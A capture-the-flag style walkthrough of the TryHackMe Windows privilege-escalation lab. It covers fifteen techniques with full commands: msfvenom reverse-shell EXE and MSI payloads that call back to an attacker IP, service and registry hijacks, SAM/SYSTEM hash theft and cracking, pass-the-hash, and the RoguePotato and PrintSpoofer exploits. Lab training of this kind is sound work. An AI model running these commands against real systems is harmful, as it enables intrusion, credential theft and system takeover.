# 6 - Windows Priv Esc

Room Link --> [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)

Vpn connect -->  `xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.16.33`

#### Generate a Reverse Shell Executable

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`

Copying the payload to the victim using SMB.

`smbserver.py kali .` - kali is the name of the share.

`copy \\kali_ip\kali\reverse.exe` - on victim to get the file.

Setup a listener `nc -nvlp 53` , Launch the file and catch the shell.

## Priv Esc Vectors

We can use winPEAS.exe to search for priv esc vectors -

`.\winPEASany.exe quite sservicesinfo`&#x20;

### 1 - Service Exploits - Insecure Service Permissions

Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

`C:\PrivEsc\accesschk.exe /accepteula -uwcqve user daclsvc`

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption><p>1</p></figcaption></figure>

It shows the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME):

`sc qc daclsvc`

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption><p>2</p></figcaption></figure>

Checking if the service is running or stopped currently `sc query daclsvc`&#x20;

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption><p>3</p></figcaption></figure>

We can modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start daclsvc`

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption><p>4</p></figcaption></figure>

### 2 - Unquoted Service Paths

#### Detection

Using `winPEASany.exe quite servicesinfo` - we see an "unquotedsvc" service, lets take a look at it with `sc qc unquotedsvc`&#x20;

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption><p>1</p></figcaption></figure>

Let's check if we have "read/write" access to the path.

`.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"` - we have "RW" access, meaning we can replace the default service exe with our custom rev shell exe.

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption><p>2</p></figcaption></figure>

Copy the reverse.exe payload to the file path.

`copy reverse.exe "C:\Program Files\Unquoted Path Service\common.exe"` - copy and replace it with "common.exe"

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption><p>3</p></figcaption></figure>

Start nc listener and start the service -> `net start unquotedsvc` .

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption><p>4</p></figcaption></figure>

### 3 - Service Exploits - Weak Registry Permissions

The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

#### Detection

Run "winPEASany.exe" and check the reqistry session.

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption><p>1</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption><p>2</p></figcaption></figure>

Lets check if we have access to the dir where the file is located:

`.\accesschk.exe /accepteula -dvwq "C:\Program Files\Insecure Registry Service"` - but as we see in image 3 below, we don't have permission to write to that dir.

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption><p>3</p></figcaption></figure>

Using accesschk.exe, we see that the registry entry for the "regsvc" service is writable by the "NT AUTHORITY\INTERACTIVE" group (meaning all logged-on users):

`.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc` .

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption><p>4</p></figcaption></figure>

Now we have to modify the registry path to our rev shell location.

Overwriting the ImagePath registry key to point to the reverse.exe executable we created:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption><p>5</p></figcaption></figure>

Start nc and catch the connection.

### 4 - Service Exploits - Insecure Service Executables

#### Detection

Run winPEAS again with the same servicesinfo arguments.

<figure><img src="https://miro.medium.com/v2/resize:fit:525/1*xxY-JLNJCPGzSJN_NpxoNA.png" alt="" height="77" width="700"><figcaption><p>1 - file permission</p></figcaption></figure>

We see a "filepermservice.exe" that "Everyone" has "AllAccess", lets confirm this with "accesschk.exe".

`.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"` - and "BUILTIN\Users" has "RW" access.

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption><p>2 - users has RW access</p></figcaption></figure>

We can also see that whe we execute the file, we will get Local System privs.

`sc qc filepermsvc`&#x20;

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption><p>3 - we'd get Local System on execution</p></figcaption></figure>

`copy reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y` -

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption><p>4 - copied successfully</p></figcaption></figure>

Start nc listener and start the service -> `net start filepermsvc` .

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption><p>5 - nt authority</p></figcaption></figure>

### 5 - Registry Autoruns

Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.

#### Detection

Run winPEAS again with applicationsinfo arguments

We see the "program.exe", Everyone has access.

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption><p>1</p></figcaption></figure>

Query the registry for all AutoRun executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  - we can see the "program.exe" there.

Using accesschk.exe, note that one of the AutoRun executables ("program.exe") is writable by everyone:

`.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption><p>2</p></figcaption></figure>

Copy the reverse.exe executable and replace the AutoRun executable with it:

`copy reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption><p>3</p></figcaption></figure>

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

`rdesktop 10.10.218.69`

### 6 - Registry - AlwaysInstallElevated

> "MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.”
>
> “The catch is that two Registry settings must be enabled for this to work.\
> The “AlwaysInstallElevated” value must be set to 1 for both the local machine:\
> HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\
> and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\
> If either of these are missing or disabled, the exploit will not work.”

#### Detection

Run winPEAS with windowscreds arguments.\


<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption><p>1</p></figcaption></figure>

Or we can Query the registry for AlwaysInstallElevated keys:

{% code overflow="wrap" lineNumbers="true" %}
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
{% endcode %}

In this case both keys are already set to 1 (0x1)

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.214 LPORT=53 -f msi -o reverse.msi`

Transfer the reverse.msi file to the victim, start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption><p>2 - got shell</p></figcaption></figure>

And we get shell.

### 7 - Passwords Registy

> “Even administrators re-use their passwords, or leave their passwords on systems in readable locations. Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.”
>
> Registry — “Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.”

#### Detection

Run winPEAS with filesinfo (Search files that can contains credentials) and userinfo (Search user information) arguments.

`.\winPEASany.exe quite filesinfo userinfo` -

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption><p>1</p></figcaption></figure>

We could also query this specific Registry key to find admin AutoLogon credentials in order to save time:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privilegess.

`winexe -U 'admin%password' //10.10.229.206 cmd.exe`

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption><p>we get system</p></figcaption></figure>

### 8 - Passwords - Saved Creds

> “Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.”

Run winPEAS with cmd (Obtain wifi, cred manager and clipboard information executing CMD commands) and windowscreds (Search windows credentials) arguments.

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption><p>1</p></figcaption></figure>

Alternatively, we can run below command too.

`cmdkey /list`&#x20;

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption><p>2</p></figcaption></figure>

Now we know that admin credentials are stored in windows credentials manager vault. We can use to get the reverse shell with admin privileges. Setup a new netcat listener in another tab and run below command.

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption><p>3</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption><p>4 - we get system</p></figcaption></figure>

### 9 - Passwords - Security Account Manager (SAM)

> “Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.”
>
> The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.\
> The files are locked while Windows is running.\
> Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.

Now we need to find SAM & SYSTEM files and copy to Kali Linux using samba service.

{% code overflow="wrap" lineNumbers="true" %}
```powershell
# Transfer the SAM and SYSTEM files to kali.
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```
{% endcode %}

We successfully copied SAM and SYSTEM to our Kali Linux machine. Now we need to extract the hash using another tool called ‘[CredDump](https://github.com/Neohapsis/creddump7.git)’. Its installed by default in kali.

`/usr/share/creddump7/pwdump.py SYSTEM SAM` - cmd to dump hashes.

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption><p>hashes</p></figcaption></figure>

Cracking the admin NTLM hash using hashcat:

`hashcat -m 1000 --force hashes /usr/share/wordlists/rockyou.txt` -&#x20;

We get the passwords for each account.

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### 10 - Passwords - Passing the Hash

When we get the admin user NTHash/NTLM hash, we can use pass-the-hash attack to authenticate with the hash instead.

`pth-winexe -U 'admin%<LM:NTHas>' 10.10.124.222 cmd.exe` .

### 11 - Scheduled Tasks

Run below command to list all scheduled tasks our user can see.

> `schtasks /query /fo LIST /v` .
>
> `PS> Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State`&#x20;

According to the task, there’s a script in C drive called cleanup.ps1.

<figure><img src="https://miro.medium.com/v2/resize:fit:525/1*wiFCPs8nNtHO0_xxMI9Kmw.png" alt="" height="223" width="700"><figcaption><p>devtools</p></figcaption></figure>

Let’s check the permissions on this file using accesschk application.

`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

We are able to append and write data to this script. So, let’s append our reverse.exe to this script to get back reverse shell on our machine.

`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`

Setup a nc listener adn wait for the script to run.

### 12 - Insecure GUI Apps

On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges. We call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

Start an RDP session as the "user" account:

`rdesktop -u user -p password321 10.10.124.222`

Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:

`tasklist /V | findstr mspaint.exe`

In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe

Press Enter to spawn a command prompt running with admin privileges.

### 13 - Startup Apps

> “Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.”

Let’s do a permission check on that folder using accesschk:

`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

<figure><img src="https://miro.medium.com/v2/resize:fit:525/1*fI0-sxtAwd1AhvhoJ0NyIg.png" alt="" height="248" width="700"><figcaption><p>accesschk</p></figcaption></figure>

As you can see, our builtin user (\Users) has access to read/write on this directory. So, we can add a startup script to this directory upon script execution we would get a admin privileges.

They have already given us the script in “PrivEsc” directory.

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption><p>2</p></figcaption></figure>

As you can see, if we invoke this script, then it’d create a link (lnk) file in startup folder with specified path of our reverse shelll executable, since the "reverse.exe" file is in same folder with the ".vbs" script file.

`cscript C:\PrivEsc\CreateShortcut.vbs`

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

`rdesktop -u admin 10.10.124.222`

A shell running as admin should connect back to your listener.

### 14 - Token Impersonation - Rogue Potato

> There are a lot of different potatoes used to escalate privileges from Windows Service Accounts to NT AUTHORITY/SYSTEM.
>
> [Hot](https://foxglovesecurity.com/2016/01/16/hot-potato/), [Rotten](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/), [Lonely](https://decoder.cloud/2017/12/23/the-lonely-potato/), [Juicy](https://ohpe.it/juicy-potato/) and [Rogue](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/) are family of potato exploits.
>
> **TL;DR** — Every potato attack has it’s own limitations:\
> If the machine is >= Windows 10 1809 & Windows Server 2019 — Try Rogue Potato\
> If the machine is < Windows 10 1809 < Windows Server 2019 — Try Juicy Potato

This can only be done if current account has the **privilege to impersonate security tokens**. This is usually true of most service accounts and not true of most user-level accounts. In our case, we don’t have Privilege to impersonate security tokens.

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption><p>1</p></figcaption></figure>

This challenge is about gaining a local service account access and using it to elevate privileges to system. So, first we need to get a reverse shell of local service on our kali linux. To do that we need to start a net cat listener and run below command from RDP session command prompt. (note: to run this below command we need administrator privileges).

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption><p>2 - local service shell</p></figcaption></figure>

We have "SeImpersonatePrivilege" now.

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption><p>3 - local service shell</p></figcaption></figure>

We have a local service access, now we need to setup a network redirector/port forwarder on our kali linux machine (must use 135 as source port) and redirecting back to Remote on any tcp port.

`sudo socat tcp-listen:135,reuseaddr,fork, tcp:10.18.88.214:4444`&#x20;

> What’s happening in above command is we are opening a port #135 on kali machine, accepting connections, and forwarding the connections to port 4444 on the remote host (target).

Now we need to run rogue potato binary file on target with arguments (on the local system shell we obtained).&#x20;

Before we do that, we need to start another netcat listener on kali machine.

`C:\PrivEsc\RoguePotato.exe -r 10.18.88.214 -e "C:\PrivEsc\reverse.exe" -l 9999` - "-r" (remote IP — Kali IP), "-e" (reverse shell executable path) and "-l" listening port.&#x20;

this is run on the (local system) shell we got earlier in Image 2.

Finally..

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption><p>3</p></figcaption></figure>

And We get "NT Authority"

### 15 - **Token Impersonation — PrintSpoofer**

The goal of [PrintSpoofer](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) and RoguePotato is same to elevate privileges using same technique “SeImpersonatePrivilege”.&#x20;

> Exploit tools of the Potato family are all based on the same idea: relaying a network authentication from a loopback TCP endpoint to an NTLM negotiator. To do so, they trick the NT AUTHORITY\SYSTEM account into connecting and authenticating to an RPC server they control by leveraging some peculiarities of the IStorage COM interface. This blog explains more technically than I ever could. [Read](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

So, this exploit to work, we need local service or network service access and with “SeImpersonatePrivilege” or “SeAssignPrimaryTokenPrivilege” enabled.

Just like in Section 14, we need "Local Service" access 1st.&#x20;

Start another listener on Kali, Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption><p>Done</p></figcaption></figure>

## Conclusion

### Privilege Escalation Scripts

Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:

winPEASany.exe

Seatbelt.exe

PowerUp.ps1

SharpUp.exe

